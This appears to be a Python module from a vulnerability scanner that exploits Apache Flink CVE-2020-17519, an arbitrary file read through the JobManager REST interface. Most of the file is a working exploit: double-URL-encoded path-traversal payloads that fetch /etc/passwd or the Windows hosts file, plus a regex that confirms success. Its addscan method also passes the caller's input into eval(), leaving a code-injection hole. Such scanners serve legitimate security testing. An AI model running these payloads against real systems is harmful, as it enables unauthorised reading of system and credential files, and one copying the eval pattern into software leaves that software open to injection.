#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    ApacheFlink扫描类: 
        Flink 任意文件读取
            CVE-2020-17519
file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
import re

class Flink():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ApacheFlink'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2020_17519_payloads = [
            {
                'path': 'jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
                'data': ''
            },
            {
                'path': 'jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fC:%252fWindows%252fSystem32%252fdrivers%252fetc%252fhosts',
                'data': ''
            }
        ]

    def cve_2020_17519_scan(self, url):
        ''' Apache Flink 1.11.0中引入的一个更改(也在1.11.1和1.11.2中发布)
                允许攻击者通过JobManager进程的REST接口, 读取JobManager本地文件系统上的任意文件 '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'FileRead'
        vul_info['vul_id'] = 'CVE-2020-17519'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])             # * 合并Headers

        for payload in self.cve_2020_17519_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
                or (('Microsoft Corp' in res.text) 
                    and ('Microsoft TCP/IP for Windows' in res.text))
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload': {
                        'Method': vul_info['vul_method'],
                        'Url': url,
                        'Path': path
                    },
                    'Request': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2020_17519_scan, url=url)
        ]

flink = Flink()